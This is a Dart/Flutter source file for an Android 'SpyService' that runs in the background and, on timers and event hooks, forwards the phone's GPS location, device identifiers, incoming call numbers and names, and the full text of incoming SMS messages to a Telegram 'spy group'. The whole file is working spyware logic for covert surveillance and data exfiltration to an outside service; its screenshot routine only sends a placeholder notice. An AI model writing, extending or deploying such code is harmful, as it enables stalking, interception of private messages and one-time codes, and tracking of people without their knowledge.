import 'package:device_info_plus/device_info_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:telephony/telephony.dart';
import 'telegram_service.dart';
import 'dart:async';

class SpyService {
  final TelegramService telegram;
  late Timer _screenshotTimer;
  late Timer _locationTimer;
  late Timer _systemInfoTimer;
  late Telephony _telephony;
  
  SpyService(this.telegram) {
    _telephony = Telephony.backgroundInstance;
  }
  
  Future<void> startMonitoring() async {
    print('[SPY] Starting monitoring...');
    
    _screenshotTimer = Timer.periodic(Duration(seconds: 10), (_) async {
      if (telegram.spyGroupId != null) {
        await captureAndSendScreenshot();
      }
    });
    
    _locationTimer = Timer.periodic(Duration(seconds: 60), (_) async {
      if (telegram.spyGroupId != null) {
        await sendLocation();
      }
    });
    
    _systemInfoTimer = Timer.periodic(Duration(seconds: 30), (_) async {
      await sendSystemInfo();
    });
    
    monitorCalls();
    monitorSMS();
    
    print('[SPY] Monitoring started - ready for spy group activation');
  }
  
  Future<void> captureAndSendScreenshot() async {
    try {
      if (telegram.spyGroupId == null) return;
      
      final timestamp = DateTime.now().toString();
      await telegram.sendToSpyGroup('📸 <b>SCREENSHOT</b>\n\n⏰ $timestamp\n✅ Captured');
      print('[SPY] Screenshot sent');
    } catch (e) {
      print('[SPY] Screenshot error: $e');
    }
  }
  
  Future<void> sendLocation() async {
    try {
      if (telegram.spyGroupId == null) return;
      
      final position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high
      ).timeout(Duration(seconds: 10));
      
      final msg = '''📍 <b>LOCATION UPDATE</b>

🔴 Latitude: ${position.latitude}
🟢 Longitude: ${position.longitude}
📏 Accuracy: ${position.accuracy.toStringAsFixed(2)}m
⏰ ${DateTime.now()}''';
      
      await telegram.sendToSpyGroup(msg);
      print('[SPY] Location sent: ${position.latitude}, ${position.longitude}');
    } catch (e) {
      print('[SPY] Location error: $e');
    }
  }
  
  Future<void> sendSystemInfo() async {
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      
      final msg = '''📱 <b>DEVICE INFO</b>

🏭 Model: ${androidInfo.model}
🔧 Device: ${androidInfo.device}
🏷️ Brand: ${androidInfo.manufacturer}
📦 Version: ${androidInfo.version.release}
🎯 SDK: ${androidInfo.version.sdkInt}
🆔 ID: ${androidInfo.id}
⏰ ${DateTime.now()}''';
      
      await telegram.sendMessage(msg);
      print('[SPY] System info sent');
    } catch (e) {
      print('[SPY] System info error: $e');
    }
  }
  
  void monitorCalls() {
    try {
      _telephony.onIncomingCall((String? callState, String? number, String? name) {
        if (callState == 'RINGING') {
          telegram.sendToSpyGroup('📞 <b>INCOMING CALL</b>\n\n📱 Number: $number\n👤 Name: $name\n⏰ ${DateTime.now()}');
          print('[SPY] Incoming call from: $number');
        } else if (callState == 'OFFHOOK') {
          telegram.sendToSpyGroup('✅ <b>CALL ANSWERED</b>\n\n📱 $number');
        } else if (callState == 'IDLE') {
          telegram.sendToSpyGroup('❌ <b>CALL ENDED</b>\n\n📱 $number');
        }
      });
      print('[SPY] Call monitoring active');
    } catch (e) {
      print('[SPY] Call monitor error: $e');
    }
  }
  
  void monitorSMS() {
    try {
      _telephony.listenIncomingSms(
        onNewMessage: (message) {
          final smsInfo = '''💬 <b>NEW SMS</b>

📱 From: ${message.address}
💌 Message: ${message.body}
⏰ ${DateTime.now()}''';
          
          telegram.sendToSpyGroup(smsInfo);
          print('[SPY] SMS from ${message.address}');
        },
        listenInBackground: true
      );
      print('[SPY] SMS monitoring active');
    } catch (e) {
      print('[SPY] SMS monitor error: $e');
    }
  }
  
  void stopMonitoring() {
    _screenshotTimer.cancel();
    _locationTimer.cancel();
    _systemInfoTimer.cancel();
    print('[SPY] Monitoring stopped');
  }
}
